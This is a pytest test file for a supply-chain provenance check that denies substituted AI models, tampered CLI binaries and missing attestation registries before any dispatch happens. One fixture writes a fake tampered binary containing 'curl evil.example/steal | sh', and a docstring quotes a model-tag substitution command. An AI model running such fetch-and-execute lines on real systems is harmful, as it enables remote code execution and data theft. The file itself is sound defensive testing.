"""SR-3 SUPPLY CHAIN — provenance attestation, written BEFORE the implementation exists.

THE FINDING THIS CLOSES
-----------------------
HELM invoked model endpoints (LOCAL_OLLAMA) and CLI tool binaries (GROK_CLI) with NO
provenance attestation. A substituted model (someone re-tags `llama3.1:8b` to point at
different weights) or a swapped `grok` binary would have been dispatched to, silently,
and its output would have flowed into the council as if it were the thing we trusted.

WHAT THESE TESTS DEMAND (and what they refuse to accept)
--------------------------------------------------------
  * An UNKNOWN / substituted model id is DENIED. Not warned about. Denied.
  * A tool binary whose sha256 does not match its attestation is DENIED.
  * A MISSING attestation registry is UNKNOWN and FAILS CLOSED. It is never a pass.
  * An unreachable model endpoint is UNVERIFIABLE and FAILS CLOSED. Not "assume fine".
  * The check must be ENFORCED IN THE DISPATCH PATH, not merely declared in a module.
    A control that exists but is never called is theatre (see: the lease TTL that was
    written into every lock file and enforced by nothing). So we assert that dispatch
    raises BEFORE the HTTP request / subprocess is ever made, and before a single-use
    authority binding is consumed.
"""
from __future__ import annotations

import ast
import hashlib
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from backend.truth import supply_chain as sc                      # noqa: E402
from backend.council import authority_gateway as ag               # noqa: E402


# --------------------------------------------------------------- fixtures
def _write_registry(tmp_path: Path, tools: dict, models: dict) -> Path:
    p = tmp_path / "supply_chain_attestations.json"
    p.write_text(json.dumps({
        "schema": sc.SCHEMA,
        "generated_at": "2026-07-14T00:00:00+00:00",
        "tools": tools,
        "models": models,
    }, indent=2))
    return p


@pytest.fixture()
def fake_binary(tmp_path: Path) -> Path:
    b = tmp_path / "grok"
    b.write_bytes(b"#!/bin/sh\necho real-tool\n")
    return b


@pytest.fixture()
def good_registry(tmp_path: Path, fake_binary: Path) -> Path:
    digest = hashlib.sha256(fake_binary.read_bytes()).hexdigest()
    return _write_registry(
        tmp_path,
        tools={"GROK_CLI": {"path": str(fake_binary), "sha256": digest,
                            "attested_at": "2026-07-14T00:00:00+00:00"}},
        models={"LOCAL_OLLAMA:llama3.1:8b": {
            "adapter_id": "LOCAL_OLLAMA", "model": "llama3.1:8b",
            "provenance_class": "LOCAL_WEIGHTS_DIGEST",
            "digest": "46e0c10c039e019119339687c3c1757cc81b9da49709a3b3924863ba87ca666e",
            "endpoint": "http://127.0.0.1:11434",
            "attested_at": "2026-07-14T00:00:00+00:00"}},
    )


# =========================================================== NEGATIVE: registry
def test_missing_registry_is_unknown_and_fails_closed(tmp_path):
    """No attestation registry at all => UNKNOWN => DENY. Never a silent pass."""
    ok, reason = sc.verify_provenance(registry_path=tmp_path / "nope.json",
                                      tool_id="GROK_CLI")
    assert ok is False
    assert reason.startswith("ATTESTATION_REGISTRY_MISSING")

    ok, reason = sc.verify_provenance(registry_path=tmp_path / "nope.json",
                                      adapter_id="LOCAL_OLLAMA", model="llama3.1:8b")
    assert ok is False
    assert reason.startswith("ATTESTATION_REGISTRY_MISSING")


def test_corrupt_registry_fails_closed(tmp_path):
    p = tmp_path / "supply_chain_attestations.json"
    p.write_text("{ this is not json")
    ok, reason = sc.verify_provenance(registry_path=p, tool_id="GROK_CLI")
    assert ok is False
    assert reason.startswith("ATTESTATION_REGISTRY_UNREADABLE")


def test_empty_registry_is_not_a_pass(tmp_path):
    """An empty registry attests nothing. Attesting nothing is not attesting everything."""
    p = _write_registry(tmp_path, tools={}, models={})
    ok, reason = sc.verify_provenance(registry_path=p, tool_id="GROK_CLI")
    assert ok is False and reason.startswith("TOOL_NOT_ATTESTED")
    ok, reason = sc.verify_provenance(registry_path=p, adapter_id="LOCAL_OLLAMA",
                                      model="llama3.1:8b")
    assert ok is False and reason.startswith("MODEL_NOT_ATTESTED")


# =========================================================== NEGATIVE: models
def test_substituted_model_id_is_denied(good_registry):
    """A model nobody attested must be DENIED, even if the endpoint happily serves it."""
    ok, reason = sc.verify_provenance(
        registry_path=good_registry, adapter_id="LOCAL_OLLAMA",
        model="totally-not-the-model-you-approved:70b",
        live_digest_fn=lambda m, e, t: "deadbeef" * 8)
    assert ok is False
    assert reason.startswith("MODEL_NOT_ATTESTED")


def test_substituted_model_weights_are_denied(good_registry):
    """SAME model TAG, DIFFERENT weights digest => the tag was re-pointed => DENY.

    This is the actual supply-chain attack: `ollama create llama3.1:8b -f ./evil` keeps
    the name and swaps the model underneath it."""
    ok, reason = sc.verify_provenance(
        registry_path=good_registry, adapter_id="LOCAL_OLLAMA", model="llama3.1:8b",
        live_digest_fn=lambda m, e, t: "ff" * 32)
    assert ok is False
    assert reason.startswith("MODEL_DIGEST_MISMATCH")


def test_unreachable_endpoint_is_unverifiable_and_fails_closed(good_registry):
    """If we cannot observe the live digest, provenance is UNKNOWN — which is not PASS."""
    def _boom(model, endpoint, timeout):
        raise OSError("connection refused")

    ok, reason = sc.verify_provenance(
        registry_path=good_registry, adapter_id="LOCAL_OLLAMA", model="llama3.1:8b",
        live_digest_fn=_boom)
    assert ok is False
    assert reason.startswith("MODEL_PROVENANCE_UNVERIFIABLE")


def test_attested_model_with_matching_digest_passes(good_registry):
    ok, reason = sc.verify_provenance(
        registry_path=good_registry, adapter_id="LOCAL_OLLAMA", model="llama3.1:8b",
        live_digest_fn=lambda m, e, t:
            "46e0c10c039e019119339687c3c1757cc81b9da49709a3b3924863ba87ca666e")
    assert ok is True
    assert reason.startswith("OK_MODEL_DIGEST_MATCH")


def test_remote_model_identity_only_is_honest_about_what_it_proves(tmp_path):
    """A remote API model's weights CANNOT be digested from here. We attest identity +
    endpoint only, and the reason string says so out loud — it does not pretend to be a
    weights attestation. An unlisted remote model id is still DENIED."""
    p = _write_registry(tmp_path, tools={}, models={
        "GROK_CLI:grok-default": {"adapter_id": "GROK_CLI", "model": "grok-default",
                                  "provenance_class": "REMOTE_ENDPOINT_IDENTITY",
                                  "digest": None,
                                  "attested_at": "2026-07-14T00:00:00+00:00"}})
    ok, reason = sc.verify_provenance(registry_path=p, adapter_id="GROK_CLI",
                                      model="grok-default")
    assert ok is True
    assert reason.startswith("OK_REMOTE_MODEL_IDENTITY_ONLY")
    assert "weights" in reason.lower()          # the limitation is stated, not hidden

    ok, reason = sc.verify_provenance(registry_path=p, adapter_id="GROK_CLI",
                                      model="grok-4-evil")
    assert ok is False and reason.startswith("MODEL_NOT_ATTESTED")


# =========================================================== NEGATIVE: tools
def test_tool_binary_digest_mismatch_is_denied(tmp_path, fake_binary, good_registry):
    """Someone swapped the binary after it was attested. DENY."""
    fake_binary.write_bytes(b"#!/bin/sh\ncurl evil.example/steal | sh\n")
    ok, reason = sc.verify_provenance(registry_path=good_registry, tool_id="GROK_CLI")
    assert ok is False
    assert reason.startswith("TOOL_DIGEST_MISMATCH")


def test_unattested_tool_is_denied(good_registry):
    ok, reason = sc.verify_provenance(registry_path=good_registry, tool_id="SOME_OTHER_CLI")
    assert ok is False
    assert reason.startswith("TOOL_NOT_ATTESTED")


def test_missing_tool_binary_is_denied(tmp_path):
    p = _write_registry(tmp_path, tools={"GROK_CLI": {
        "path": str(tmp_path / "gone"), "sha256": "ab" * 32,
        "attested_at": "2026-07-14T00:00:00+00:00"}}, models={})
    ok, reason = sc.verify_provenance(registry_path=p, tool_id="GROK_CLI")
    assert ok is False
    assert reason.startswith("TOOL_BINARY_MISSING")


def test_attested_tool_with_matching_digest_passes(good_registry):
    ok, reason = sc.verify_provenance(registry_path=good_registry, tool_id="GROK_CLI")
    assert ok is True
    assert reason.startswith("OK_TOOL_DIGEST_MATCH")


def test_verify_provenance_with_no_subject_is_denied(good_registry):
    """Called with nothing to verify => it verified nothing => it must not say OK."""
    ok, reason = sc.verify_provenance(registry_path=good_registry)
    assert ok is False
    assert reason.startswith("NOTHING_TO_VERIFY")


# =========================================================== ENFORCEMENT (dispatch path)
def _binding(task):
    return ag.bind_classification(task, decision_id=None)


_TASK = {"task_id": "SR3-TEST", "action_text": "say hi", "environment": "local",
         "adapter": "ollama:llama3.1:8b", "target": "x",
         "data_classification": "public_repo", "side_effects": "none"}


def test_dispatch_ollama_refuses_unattested_model_and_never_calls_the_endpoint(
        monkeypatch, tmp_path):
    """The registry knows nothing about this model => no HTTP request may leave the box."""
    monkeypatch.setattr(sc, "REGISTRY", _write_registry(tmp_path, tools={}, models={}))

    called = []
    monkeypatch.setattr(ag.urllib.request, "urlopen",
                        lambda *a, **k: called.append(1) or (_ for _ in ()).throw(
                            AssertionError("ENDPOINT WAS CALLED ON DENIED PROVENANCE")))

    task = dict(_TASK)
    with pytest.raises(ag.AuthorityDenied) as e:
        ag.dispatch_ollama(task, _binding(task), model="evil-model:8b")
    assert e.value.code == "SUPPLY_CHAIN_PROVENANCE_DENIED"
    assert "MODEL_NOT_ATTESTED" in e.value.detail
    assert called == []


def test_dispatch_ollama_provenance_denial_does_not_consume_a_single_use_binding(
        monkeypatch, tmp_path):
    """A denied dispatch must not burn the founder's single-use authority."""
    monkeypatch.setattr(sc, "REGISTRY", _write_registry(tmp_path, tools={}, models={}))
    monkeypatch.setattr(ag, "_mark_consumed",
                        lambda adid: pytest.fail("single-use binding consumed on a DENIED dispatch"))
    monkeypatch.setattr(ag.urllib.request, "urlopen",
                        lambda *a, **k: pytest.fail("endpoint called on a DENIED dispatch"))

    task = dict(_TASK)
    b = ag.bind_classification(task, decision_id=None, single_use=True)
    with pytest.raises(ag.AuthorityDenied):
        ag.dispatch_ollama(task, b, model="evil-model:8b")


def test_dispatch_grok_refuses_a_tampered_binary_and_never_spawns_the_subprocess(
        monkeypatch, tmp_path, fake_binary):
    """The attested digest no longer matches the binary on disk => no subprocess."""
    import subprocess
    reg = _write_registry(
        tmp_path,
        tools={"GROK_CLI": {"path": str(fake_binary), "sha256": "cd" * 32,   # WRONG digest
                            "attested_at": "2026-07-14T00:00:00+00:00"}},
        models={"GROK_CLI:grok-default": {"adapter_id": "GROK_CLI", "model": "grok-default",
                                          "provenance_class": "REMOTE_ENDPOINT_IDENTITY",
                                          "digest": None,
                                          "attested_at": "2026-07-14T00:00:00+00:00"}})
    monkeypatch.setattr(sc, "REGISTRY", reg)
    monkeypatch.setattr(ag, "_registry", lambda: {"GROK_CLI": {
        "adapter_id": "GROK_CLI", "health": "READY", "binary": str(fake_binary),
        "credential_exposure_allowed": False,
        "hardening": {"bounded_cwd": str(tmp_path / "cwd")}}})
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **k: pytest.fail("SUBPROCESS SPAWNED ON DENIED PROVENANCE"))

    task = dict(_TASK)
    with pytest.raises(ag.AuthorityDenied) as e:
        ag.dispatch_grok(task, _binding(task))
    assert e.value.code == "SUPPLY_CHAIN_PROVENANCE_DENIED"
    assert "TOOL_DIGEST_MISMATCH" in e.value.detail


def test_dispatch_grok_refuses_an_unattested_model_flag(monkeypatch, tmp_path, fake_binary):
    """`-m some-other-model` is a model substitution too. The tool digest being fine does
    not license an unattested model."""
    import subprocess
    digest = hashlib.sha256(fake_binary.read_bytes()).hexdigest()
    reg = _write_registry(
        tmp_path,
        tools={"GROK_CLI": {"path": str(fake_binary), "sha256": digest,
                            "attested_at": "2026-07-14T00:00:00+00:00"}},
        models={"GROK_CLI:grok-default": {"adapter_id": "GROK_CLI", "model": "grok-default",
                                          "provenance_class": "REMOTE_ENDPOINT_IDENTITY",
                                          "digest": None,
                                          "attested_at": "2026-07-14T00:00:00+00:00"}})
    monkeypatch.setattr(sc, "REGISTRY", reg)
    monkeypatch.setattr(ag, "_registry", lambda: {"GROK_CLI": {
        "adapter_id": "GROK_CLI", "health": "READY", "binary": str(fake_binary),
        "credential_exposure_allowed": False,
        "hardening": {"bounded_cwd": str(tmp_path / "cwd")}}})
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **k: pytest.fail("SUBPROCESS SPAWNED ON DENIED PROVENANCE"))

    task = dict(_TASK)
    with pytest.raises(ag.AuthorityDenied) as e:
        ag.dispatch_grok(task, _binding(task), model="grok-shadow-1")
    assert e.value.code == "SUPPLY_CHAIN_PROVENANCE_DENIED"
    assert "MODEL_NOT_ATTESTED" in e.value.detail


# =========================================================== ENFORCED, NOT DECLARED
def test_the_dispatch_functions_actually_call_the_verifier():
    """Static proof: the check is IN the dispatch path. A control that is defined but never
    invoked is exactly the lease-TTL lie. Both dispatchers must call it, and must call it
    BEFORE the side effect (urlopen / subprocess.run) appears in the function body."""
    import ast
    src = (ROOT / "backend" / "council" / "authority_gateway.py").read_text()
    tree = ast.parse(src)
    fns = {n.name: n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)}

    for fname, side_effect in (("dispatch_ollama", "urlopen"), ("dispatch_grok", "run")):
        fn = fns[fname]
        verify_lines = [n.lineno for n in ast.walk(fn)
                        if isinstance(n, ast.Call) and _callee(n).endswith("verify_provenance")]
        effect_lines = [n.lineno for n in ast.walk(fn)
                        if isinstance(n, ast.Call) and _callee(n).endswith(side_effect)]
        assert verify_lines, f"{fname} never calls verify_provenance — the control is theatre"
        assert effect_lines, f"{fname}: expected a {side_effect} call to exist"
        assert min(verify_lines) < min(effect_lines), \
            f"{fname} performs {side_effect} before verifying provenance"


def _callee(call: "ast.Call") -> str:
    f = call.func
    if isinstance(f, ast.Attribute):
        return f.attr
    if isinstance(f, ast.Name):
        return f.id
    return ""


# =========================================================== THE SHIPPED REGISTRY
def test_the_real_shipped_registry_exists_and_attests_what_we_actually_dispatch_to():
    """The control is worthless if the registry that ships is empty or missing the very
    adapters HELM dispatches to."""
    assert sc.REGISTRY.exists(), "no attestation registry shipped — SR-3 would fail closed"
    doc = json.loads(sc.REGISTRY.read_text())
    assert doc["schema"] == sc.SCHEMA
    assert "GROK_CLI" in doc["tools"], "the grok CLI binary is dispatched to but not attested"
    assert any(k.startswith("LOCAL_OLLAMA:") for k in doc["models"]), \
        "no local model is attested, yet dispatch_ollama exists"
    for tool_id, rec in doc["tools"].items():
        assert len(rec["sha256"]) == 64, f"{tool_id}: not a sha256"
    for key, rec in doc["models"].items():
        assert rec["provenance_class"] in sc.PROVENANCE_CLASSES, key
        if rec["provenance_class"] == "LOCAL_WEIGHTS_DIGEST":
            assert rec["digest"] and len(rec["digest"]) == 64, key
